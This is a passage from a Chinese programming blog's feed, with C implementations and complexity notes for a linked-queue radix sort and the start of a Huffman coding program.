class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-comment">// 定义链表结点</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">int</span> data;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">next</span>;</span><br>&#125; Node;<br><span class="hljs-comment">// 定义队列结构</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Queue</span></span><br><span class="hljs-class">&#123;</span><br>    Node* front;  <span class="hljs-comment">// 队列前端</span><br>    Node* rear;   <span class="hljs-comment">// 队列后端</span><br>&#125; Queue;<br><br>Queue <span class="hljs-built_in">queue</span>[<span class="hljs-number">10</span>];  <span class="hljs-comment">// 10 个队列，用于分配和收集数据</span><br><span class="hljs-type">int</span> divisior = <span class="hljs-number">1</span>;  <span class="hljs-comment">// 用于按位取数的除数，初始为1</span><br><br><span class="hljs-comment">// 初始化队列</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">initQueue</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    Node* p = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;data = <span class="hljs-number">0</span>;  <span class="hljs-comment">// 初始化结点数据为0</span><br>        p-&gt;next = <span class="hljs-literal">NULL</span>;<br>        (*que).front = p;<br>        (*que).rear = p;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;node apply error!\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 入队操作</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">push</span><span class="hljs-params">(Queue* que, <span class="hljs-type">int</span> e)</span><br>&#123;<br>    Node* p = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Node));<br>    <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        p-&gt;data = e;<br>        p-&gt;next = <span class="hljs-literal">NULL</span>;<br>        (*que).rear-&gt;next = p;  <span class="hljs-comment">// 将新结点插入队尾</span><br>        (*que).rear = p;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;node apply error!\n&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 清空队列</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">clear</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    (*que).front-&gt;next = <span class="hljs-literal">NULL</span>;<br>    (*que).rear = (*que).front;<br>&#125;<br><br><span class="hljs-comment">// 获取最大数的位数</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">maxBit</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    Node* p = (*que).front-&gt;next;<br>    <span class="hljs-type">int</span> maxData = p-&gt;data;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-keyword">if</span> (maxData &lt; p-&gt;data) &#123;<br>            maxData = p-&gt;data;<br>        &#125;<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-type">int</span> b = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">while</span> (maxData &gt; <span class="hljs-number">0</span>) &#123;<br>        maxData /= <span class="hljs-number">10</span>;<br>        b++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> b;<br>&#125;<br><br><span class="hljs-comment">// 根据当前位数获取关键字</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">getKey</span><span class="hljs-params">(Node* q)</span><br>&#123;<br>    <span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br>    k = ((*q).data / divisior) % <span class="hljs-number">10</span>;<br>    <span class="hljs-keyword">return</span> k;<br>&#125;<br><br><span class="hljs-comment">// 分配数据到各个队列中</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">distributeRadix</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        initQueue(&amp;<span class="hljs-built_in">queue</span>[i]);  <span class="hljs-comment">// 初始化10个队列</span><br>    &#125;<br>    Node* p = (*que).front-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-type">int</span> k = getKey(p); <br>        <span class="hljs-built_in">queue</span>[k].rear-&gt;next = p;  <span class="hljs-comment">// 将当前结点放入对应队列中</span><br>        <span class="hljs-built_in">queue</span>[k].rear = p;  <span class="hljs-comment">// 更新队列尾结点</span><br>        p = p-&gt;next;<br>        <span class="hljs-built_in">queue</span>[k].rear-&gt;next = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    clear(que);  <span class="hljs-comment">// 清空原队列</span><br>&#125;<br><br><span class="hljs-comment">// 将数据收集到原队列中</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">collectRadix</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    <span class="hljs-type">int</span> index = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span> (index = <span class="hljs-number">0</span>; index &lt; <span class="hljs-number">10</span>; index++) &#123;<br>        <span class="hljs-keyword">if</span> (&amp;<span class="hljs-built_in">queue</span>[index].front-&gt;next-&gt;data != <span class="hljs-literal">NULL</span>) &#123;  <span class="hljs-comment">// 找到第一个非空队列</span><br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    Node* p = <span class="hljs-built_in">queue</span>[index].front-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        (*que).rear-&gt;next = p;  <span class="hljs-comment">// 将队列中的数据接入原队列</span><br>        (*que).rear = p; <br>        p = p-&gt;next;<br>        (*que).rear-&gt;next = <span class="hljs-literal">NULL</span>;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (index++; index &lt; <span class="hljs-number">10</span>; index++) &#123;<br>        Node* q = <span class="hljs-built_in">queue</span>[index].front-&gt;next; <br>        <span class="hljs-keyword">while</span> (q != <span class="hljs-literal">NULL</span>) &#123;<br>            (*que).rear-&gt;next = q; <br>            (*que).rear = q;<br>            q = q-&gt;next;<br>            (*que).rear-&gt;next = <span class="hljs-literal">NULL</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        clear(&amp;<span class="hljs-built_in">queue</span>[i]);  <span class="hljs-comment">// 清空各个队列</span><br>    &#125;<br>    divisior *= <span class="hljs-number">10</span>;  <span class="hljs-comment">// 更新除数</span><br>&#125;<br><br><span class="hljs-comment">// 基数排序</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">radix</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    <span class="hljs-type">int</span> b = maxBit(que);  <span class="hljs-comment">// 获取最大位数</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; b; i++) &#123;<br>        distributeRadix(que);  <span class="hljs-comment">// 按当前位数分配到各个队列</span><br>        collectRadix(que);  <span class="hljs-comment">// 将数据收集到原队列</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 打印队列</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">print</span><span class="hljs-params">(Queue* que)</span><br>&#123;<br>    Node* p = (*que).front-&gt;next;<br>    <span class="hljs-keyword">while</span> (p != <span class="hljs-literal">NULL</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>, p-&gt;data);<br>        p = p-&gt;next;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    Queue que;<br>    initQueue(&amp;que);<br>    <span class="hljs-type">int</span> arr[] = &#123; <span class="hljs-number">1234</span>, <span class="hljs-number">5678</span>, <span class="hljs-number">9101</span>, <span class="hljs-number">2345</span>, <span class="hljs-number">6789</span>, <span class="hljs-number">1011</span>, <span class="hljs-number">1213</span>, <span class="hljs-number">1415</span>, <span class="hljs-number">1617</span>, <span class="hljs-number">1819</span>,<br>        <span class="hljs-number">2021</span>, <span class="hljs-number">2223</span>, <span class="hljs-number">2425</span>, <span class="hljs-number">2627</span>, <span class="hljs-number">2829</span>,<span class="hljs-number">3032</span>, <span class="hljs-number">3233</span>, <span class="hljs-number">3435</span>, <span class="hljs-number">3637</span>, <span class="hljs-number">3839</span> &#125;;<br>    <span class="hljs-type">int</span> len = <span class="hljs-keyword">sizeof</span>(arr) / <span class="hljs-keyword">sizeof</span>(<span class="hljs-type">int</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; len; i++) &#123;<br>        push(&amp;que, arr[i]);  <span class="hljs-comment">// 将数据入队</span><br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;排序前序列：\n&quot;</span>);<br>    print(&amp;que);<br>    radix(&amp;que);  <span class="hljs-comment">// 进行基数排序</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;排序后序列：\n&quot;</span>);<br>    print(&amp;que);  <span class="hljs-comment">// 打印排序后的队列</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>时间复杂度：</strong></p><p>待排序列为n个记录，d个关键字，关键字的取值范围为 r，其中，一趟分配时间复杂度为 O(n)，一趟收集时间复杂度为O(rd)，共进行 d 趟分配和收集，所以链式基数排序的时间复杂度为 O( d·(n+rd) ) 。</p><p><strong>空间复杂度：</strong></p><p>O(rd + n )，因为一个桶本质是一个链式队列，一共 r 个桶，每个队列有队头和队尾两个指针，就是2 rd 个队列指针。又原来的待排序列是一个单链表，那么需要 n 个next指针。</p><p>执行结果：</p><p><img src="/../img/%E5%9F%BA%E6%95%B0%E6%8E%92%E5%BA%8F.png" alt="基数排序"></p>]]></content>
      
      
      <categories>
          
          <category> 数据结构 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 排序算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>哈夫曼编码</title>
      <link href="/2023/11/17/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/"/>
      <url>/2023/11/17/%E5%93%88%E5%A4%AB%E6%9B%BC%E6%A0%91/</url>
      
        <content type="html"><![CDATA[<p>以下代码：首先统计了输入字符序列中每个字符出现的次数，然后基于这些统计结果构建了哈夫曼树，并生成了相应的哈夫曼编码和权重</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAX_CHARACTERS 256</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span> &#123;</span><br>    <span class="hljs-type">char</span> data; <span class="hljs-comment">// 节点存储的数据</span><br>    <span class="hljs-type">int</span> frequency; <span class="hljs-comment">// 节点的频率</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">left</span>, * <span class="hljs-title">right</span>;</span> <span class="hljs-comment">// 左子节点和右子节点的指针</span><br>&#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MinTree</span> &#123;</span><br>    <span class="hljs-type">int</span> size; <span class="hljs-comment">// MinTree中存储的节点数</span><br>    <span class="hljs-type">int</span> capacity; <span class="hljs-comment">// MinTree的容量</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>** <span class="hljs-title">array</span>;</span> <span class="hljs-comment">// 存储节点的指针数组</span><br>&#125;;<br><br><span class="hljs-comment">// 创建一个新的节点</span><br><span class="hljs-keyword">struct</span> Node* <span class="hljs-title function_">newNode</span><span class="hljs-params">(<span class="hljs-type">char</span> data, <span class="hljs-type">int</span> frequency)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">node</span> =</span> (<span class="hljs-keyword">struct</span> Node*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node)); <span class="hljs-comment">// 为节点分配内存空间</span><br>    node-&gt;left = node-&gt;right = <span class="hljs-literal">NULL</span>; <span class="hljs-comment">// 初始化左子节点和右子节点指针为空</span><br>    node-&gt;data = data; <span class="hljs-comment">// 设置节点存储的数据</span><br>    node-&gt;frequency = frequency; <span class="hljs-comment">// 设置节点的频率</span><br>    <span class="hljs-keyword">return</span> node; <span class="hljs-comment">// 返回创建的节点指针</span><br>&#125;<br><br><span class="hljs-comment">// 创建一个新的MinTree</span><br><span class="hljs-comment">// capacity: MinTree的容量</span><br><span class="hljs-keyword">struct</span> MinTree* <span class="hljs-title function_">createMinTree</span><span class="hljs-params">(<span class="hljs-type">int</span> capacity)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MinTree</span>* <span class="hljs-title">minTree</span> =</span> (<span class="hljs-keyword">struct</span> MinTree*)<span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> MinTree)); <span class="hljs-comment">// 为MinTree分配内存空间</span><br>    minTree-&gt;size = <span class="hljs-number">0</span>; <span class="hljs-comment">// 初始化MinTree的节点数为0</span><br>    minTree-&gt;capacity = capacity; <span class="hljs-comment">// 设置MinTree的容量</span><br>    minTree-&gt;<span class="hljs-built_in">array</span> = (<span class="hljs-keyword">struct</span> Node**)<span class="hljs-built_in">malloc</span>(capacity * <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> Node*)); <span class="hljs-comment">// 为存储节点的指针数组分配内存空间</span><br>    <span class="hljs-keyword">return</span> minTree; <span class="hljs-comment">// 返回创建的MinTree的指针</span><br>&#125;<br><br><span class="hljs-comment">// 交换两个节点的指针</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">swapNode</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node** a, <span class="hljs-keyword">struct</span> Node** b)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">t</span> =</span> *a; <span class="hljs-comment">// 临时变量保存第一个节点的指针指向的节点</span><br>    *a = *b; <span class="hljs-comment">// 将第二个节点的指针赋值给第一个节点的指针</span><br>    *b = t; <span class="hljs-comment">// 将临时变量保存的第一个节点的指针赋值给第二个节点的指针</span><br>&#125;<br><br><span class="hljs-comment">// 将最小树中以指定索引为根节点的子树变成最小堆</span><br><span class="hljs-comment">// minTree: 最小树的指针</span><br><span class="hljs-comment">// idx: 子树的根节点索引</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">minTreeify</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> MinTree* minTree, <span class="hljs-type">int</span> idx)</span> &#123;<br>    <span class="hljs-type">int</span> smallest = idx; <span class="hljs-comment">// 假设根节点的值最小</span><br>    <span class="hljs-type">int</span> left = <span class="hljs-number">2</span> * idx + <span class="hljs-number">1</span>; <span class="hljs-comment">// 左子节点的索引</span><br>    <span class="hljs-type">int</span> right = <span class="hljs-number">2</span> * idx + <span class="hljs-number">2</span>; <span class="hljs-comment">// 右子节点的索引</span><br>    <span class="hljs-comment">// 如果左子节点存在且频率比当前最小节点小，则更新最小节点索引</span><br>    <span class="hljs-keyword">if</span> (left &lt; minTree-&gt;size &amp;&amp; minTree-&gt;<span class="hljs-built_in">array</span>[left]-&gt;frequency &lt; minTree-&gt;<span class="hljs-built_in">array</span>[smallest]-&gt;frequency)<br>        smallest = left;<br>    <span class="hljs-comment">// 如果右子节点存在且频率比当前最小节点小，则更新最小节点索引</span><br>    <span class="hljs-keyword">if</span> (right &lt; minTree-&gt;size &amp;&amp; minTree-&gt;<span class="hljs-built_in">array</span>[right]-&gt;frequency &lt; minTree-&gt;<span class="hljs-built_in">array</span>[smallest]-&gt;frequency)<br>        smallest = right;<br>    <span class="hljs-comment">// 如果最小节点不是根节点，则交换最小节点和根节点，并对交换后的子树进行调整</span><br>    <span class="hljs-keyword">if</span> (smallest != idx) &#123;<br>        swapNode(&amp;minTree-&gt;<span class="hljs-built_in">array</span>[smallest], &amp;minTree-&gt;<span class="hljs-built_in">array</span>[idx]);<br>        minTreeify(minTree, smallest);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 判断MinTree是否只有一个节点</span><br><span class="hljs-comment">// minTree: MinTree指针</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">isSizeOne</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> MinTree* minTree)</span> &#123;<br>    <span class="hljs-keyword">return</span> (minTree-&gt;size == <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-comment">// 从MinTree中提取最小节点</span><br><span class="hljs-keyword">struct</span> Node* <span class="hljs-title function_">extractMin</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> MinTree* minTree)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">temp</span> =</span> minTree-&gt;<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>]; <span class="hljs-comment">// 保存需要提取的最小节点</span><br>    minTree-&gt;<span class="hljs-built_in">array</span>[<span class="hljs-number">0</span>] = minTree-&gt;<span class="hljs-built_in">array</span>[minTree-&gt;size - <span class="hljs-number">1</span>]; <span class="hljs-comment">// 将最后一个节点移到根节点位置</span><br>    --minTree-&gt;size; <span class="hljs-comment">// MinTree大小减1</span><br>    minTreeify(minTree, <span class="hljs-number">0</span>); <span class="hljs-comment">// 重新调整MinTree的堆序性质</span><br>    <span class="hljs-keyword">return</span> temp; <span class="hljs-comment">// 返回被提取的最小节点</span><br>&#125;<br><br><span class="hljs-comment">// 向MinTree中插入一个节点</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">insertMinTree</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> MinTree* minTree, <span class="hljs-keyword">struct</span> Node* node)</span> &#123;<br>    ++minTree-&gt;size; <span class="hljs-comment">// MinTree大小增加1</span><br>    <span class="hljs-type">int</span> i = minTree-&gt;size - <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span> (i &amp;&amp; node-&gt;frequency &lt; minTree-&gt;<span class="hljs-built_in">array</span>[(i - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>]-&gt;frequency) &#123;<br>        minTree-&gt;<span class="hljs-built_in">array</span>[i] = minTree-&gt;<span class="hljs-built_in">array</span>[(i - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>]; <span class="hljs-comment">// 将父节点移到当前位置</span><br>        i = (i - <span class="hljs-number">1</span>) / <span class="hljs-number">2</span>; <span class="hljs-comment">// 更新位置到父节点的位置</span><br>    &#125;<br>    minTree-&gt;<span class="hljs-built_in">array</span>[i] = node; <span class="hljs-comment">// 将新节点插入到对应位置</span><br>&#125;<br><br><span class="hljs-comment">// 以给定的数据和频率构建哈夫曼树</span><br><span class="hljs-keyword">struct</span> Node* <span class="hljs-title function_">buildHuffmanTree</span><span class="hljs-params">(<span class="hljs-type">char</span> data[], <span class="hljs-type">int</span> frequency[], <span class="hljs-type">int</span> size)</span> &#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Node</span>* <span class="hljs-title">left</span>, * <span class="hljs-title">right</span>, * <span class="hljs-title">top</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">MinTree</span>* <span class="hljs-title">minTree</span> =</span> createMinTree(size); <span class="hljs-comment">// 创建一个最小堆，用于构建哈夫曼树</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; size; ++i) &#123;<br>        <span class="hljs-keyword">if</span> (frequency[i] &gt; <span class="hljs-number">0</span>) &#123;<br>            minTree-&gt;<span class="hljs-built_in">array</span>[minTree-&gt;size++] = newNode(data[i], frequency[i]); <span class="hljs-comment">// 将节点插入最小堆中</span><br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// 最小堆化，使堆顶元素为最小值</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = minTree-&gt;size / <span class="hljs-number">2</span> - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; --i) &#123;<br>        minTreeify(minTree, i);<br>    &#125;<br><br>    <span class="hljs-comment">// 通过不断取出堆顶和次堆顶的方式，构建哈夫曼树</span><br>    <span class="hljs-keyword">while</span> (!isSizeOne(minTree)) &#123;<br>        left = extractMin(minTree); <span class="hljs-comment">// 取出最小的节点作为左子树</span><br>        right = extractMin(minTree); <span class="hljs-comment">// 取出次小的节点作为右子树</span><br>        top = newNode(<span class="hljs-string">&#x27;$&#x27;</span>, left-&gt;frequency + right-&gt;frequency); <span class="hljs-comment">// 创建一个新的节点作为父节点</span><br>        top-&gt;left = left; <span class="hljs-comment">// 左子节点</span><br>        top-&gt;right = right; <span class="hljs-comment">// 右子节点</span><br>        insertMinTree(minTree, top); <span class="hljs-comment">// 将新节点插入最小堆中</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> extractMin(minTree); <span class="hljs-comment">// 最后返回哈夫曼树的根节点</span><br>&#125;<br><br><span class="hljs-comment">// 递归打印哈夫曼编码</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">printCodes</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> Node* root, <span class="hljs-type">int</span> arr[], <span class="hljs-type">int</span> top)</span> &#123;<br>    <span class="hljs-type">static</span> <span class="hljs-type">int</span> first = <span class="hljs-number">1</span>; <span class="hljs-comment">// 用于控制输出格式</span><br>    <span class="hljs-keyword">if</span> (!(root-&gt;left) &amp;&amp; !(root-&gt;right)) &#123; <span class="hljs-comment">// 当前节点为叶子节点</span><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Character: %c, Weight: %u, Huffman Code: &quot;</span>, root-&gt;data, root-&gt;frequency); <span class="hljs-comment">// 输出字符、频率和编码</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; top; ++i) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d&quot;</span>, arr[i]); <span class="hljs-comment">// 遍历路径数组，打印编码</span><br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>        <span class="hljs-keyword">if</span> (first) &#123; <span class="hljs-comment">// 